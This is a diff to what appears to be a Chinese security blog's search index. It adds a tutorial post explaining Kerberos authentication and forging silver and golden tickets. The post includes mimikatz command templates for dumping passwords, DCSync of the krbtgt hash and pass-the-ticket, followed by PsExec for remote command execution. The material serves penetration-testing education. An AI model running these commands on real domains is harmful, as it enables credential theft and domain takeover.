@@ -4,6 +4,31 @@
   
     
     <entry>
+      <title>kerberos浅析认证及攻击方法</title>
+      <link href="2021/01/25/kerberos%E6%B5%85%E6%9E%90%E8%AE%A4%E8%AF%81%E5%8F%8A%E6%94%BB%E5%87%BB%E6%96%B9%E6%B3%95/"/>
+      <url>2021/01/25/kerberos%E6%B5%85%E6%9E%90%E8%AE%A4%E8%AF%81%E5%8F%8A%E6%94%BB%E5%87%BB%E6%96%B9%E6%B3%95/</url>
+      
+        <content type="html"><![CDATA[<p>不要为自己的懒惰，找理由</p><p><strong>不要为自己的失败找理由</strong></p><h1 id="Kerberos认证浅析"><a href="#Kerberos认证浅析" class="headerlink" title="Kerberos认证浅析"></a>Kerberos认证浅析</h1><h2 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h2><p>在Kerberos协议中主要又三个角色的存在：</p><p>1.访问服务的Client</p><p>2.提供服务的Server</p><p>3.KDC(Key Distribution Center)密钥分发中心<br>其中KDC分为Authentication Service(简称AS)，AS为Client生成TGT、Ticket Granting Service(简称TGS)，TGS为Client生成Ticket</p><p>AD类似于本机SAM的一个数据库，存储着Client的白名单，只有在这个名单中的Client才能够申请到TGT</p><p>TGT：可以理解为入场卷，通过入场卷可以获得票据</p><p>Tickket：票据，在域中使用</p><p>KDC服务默认安装域控中，从物理层面看，AD与KDC均为域控制器</p><p>KDC服务框架中包含一个krbtgt账户，是在创建域时系统自动创建的</p><h2 id="认证流程"><a href="#认证流程" class="headerlink" title="认证流程"></a>认证流程</h2><p>这个流程可以理解为：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">有一个富豪在他的别野弄了一场宴会，邀请了Client并发送了邀请函(宴会主人不知道Client长啥样)，并且宴会由主人亲自主持。那么Client要进入宴会找到富豪得到想要的东西，有下面几道程序：</span><br><span class="line">1.邀请函 --&gt; 白名单</span><br><span class="line">2.Client来到别野大门被保安(AS)拦住Client并询问他是否有邀请函(白名单)，Client亮出邀请函，保安立马拿富豪为Client准备的礼物(TGT)给他，这下Client让司机继续驶向富豪的别野</span><br><span class="line">3.富豪的管家(TGS)早早的在别野门口等候，当管家(TGS)看到Client手上拿着礼物(TGT)，即可上来进行问好并把别野的通行卡(Ticket)给了Clent</span><br><span class="line">4.拿到了通行卡(Ticket)的Client就可以在别野中畅通无阻并找到了富豪(Server)，得到了他想要的东西</span><br></pre></td></tr></table></figure><p><img src="/2021/01/25/kerberos%E6%B5%85%E6%9E%90%E8%AE%A4%E8%AF%81%E5%8F%8A%E6%94%BB%E5%87%BB%E6%96%B9%E6%B3%95/1.png"></p><h1 id="Kerberos攻击方法"><a href="#Kerberos攻击方法" class="headerlink" title="Kerberos攻击方法"></a>Kerberos攻击方法</h1><h2 id="白银票据"><a href="#白银票据" class="headerlink" title="白银票据"></a>白银票据</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">privilege::Debug，提升权限</span><br><span class="line">sekurlsa::logonpasswords，抓取密码</span><br><span class="line">kerberos::list，查看有没有票据，假如有需要进行清除</span><br><span class="line">kerberos::purge，清除票据</span><br><span class="line">kerberos::golden &#x2F;domain:&lt;域名&gt; &#x2F;sid:&lt;域 SID&gt; &#x2F;target:&lt;目标服务器主机名&gt; &#x2F;service:&lt;服务类型&gt; &#x2F;rc4:&lt;NTLM Hash&gt; &#x2F;user:&lt;用户名&gt; &#x2F;ptt</span><br><span class="line">&#x2F;sid:SID值</span><br><span class="line">&#x2F;target:目标服务器主机名</span><br><span class="line">&#x2F;service：需要指定相关的服务名，此处为cifs</span><br><span class="line">&#x2F;rc4：域控的计算机账号ntlm hash</span><br><span class="line">&#x2F;user:要伪造的用户名，任意填写</span><br></pre></td></tr></table></figure><p><img src="/2021/01/25/kerberos%E6%B5%85%E6%9E%90%E8%AE%A4%E8%AF%81%E5%8F%8A%E6%94%BB%E5%87%BB%E6%96%B9%E6%B3%95/4.png"></p><h2 id="黄金票据"><a href="#黄金票据" class="headerlink" title="黄金票据"></a>黄金票据</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">lsadump::dcsync &#x2F;domain:域名 &#x2F;user:krbtgt</span><br><span class="line">#构造方法</span><br><span class="line">mimikatz.exe &quot;kerberos::golden &#x2F;domain:域名 &#x2F;sid:域sid &#x2F;rc4:krbtgt ntlm hash &#x2F;user:任意用户名 &#x2F;ptt&quot; exit</span><br><span class="line">sid不要复制后面的502</span><br><span class="line">#测试是否成功</span><br><span class="line">dir \\server2008.hello.com</span><br></pre></td></tr></table></figure><p><img src="/2021/01/25/kerberos%E6%B5%85%E6%9E%90%E8%AE%A4%E8%AF%81%E5%8F%8A%E6%94%BB%E5%87%BB%E6%96%B9%E6%B3%95/2.png"></p><p>可以使用PsExec进行执行命令</p><p><img src="/2021/01/25/kerberos%E6%B5%85%E6%9E%90%E8%AE%A4%E8%AF%81%E5%8F%8A%E6%94%BB%E5%87%BB%E6%96%B9%E6%B3%95/3.png"></p><p>工具下载地址</p><p><a href="https://docs.microsoft.com/en-us/sysinternals/downloads/psexec">https://docs.microsoft.com/en-us/sysinternals/downloads/psexec</a></p><h2 id="金票与银票区别"><a href="#金票与银票区别" class="headerlink" title="金票与银票区别"></a>金票与银票区别</h2><h3 id="获取的权限不同"><a href="#获取的权限不同" class="headerlink" title="获取的权限不同"></a>获取的权限不同</h3><p>金票：伪造的TGT，可以获取任意Kerberos的访问权限<br>银票：伪造的ST，只能访问指定的服务，如CIFS</p><h3 id="认证流程不同"><a href="#认证流程不同" class="headerlink" title="认证流程不同"></a>认证流程不同</h3><p>金票：同KDC交互，但不同AS交互<br>银票：不同KDC交互，直接访问Server</p><h3 id="加密方式不同"><a href="#加密方式不同" class="headerlink" title="加密方式不同"></a>加密方式不同</h3><p>金票：由krbtgt NTLM Hash 加密<br>银票：由服务账号 NTLM Hash 加密</p><h1 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h1><p><a href="https://www.jianshu.com/p/4936da524040">https://www.jianshu.com/p/4936da524040</a></p>]]></content>
+      
+      
+      <categories>
+          
+          <category> 内网渗透 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> 内网渗透 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
       <title>致远OA-ajax.do任意文件上传漏洞</title>
       <link href="2021/01/22/%E8%87%B4%E8%BF%9COA-ajax-do%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/"/>
       <url>2021/01/22/%E8%87%B4%E8%BF%9COA-ajax-do%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/</url>
@@ -199,7 +224,7 @@
             
             <tag> 渗透测试 </tag>
             
-            <tag> 内网测试 </tag>
+            <tag> 内网渗透 </tag>
             
         </tags>
       
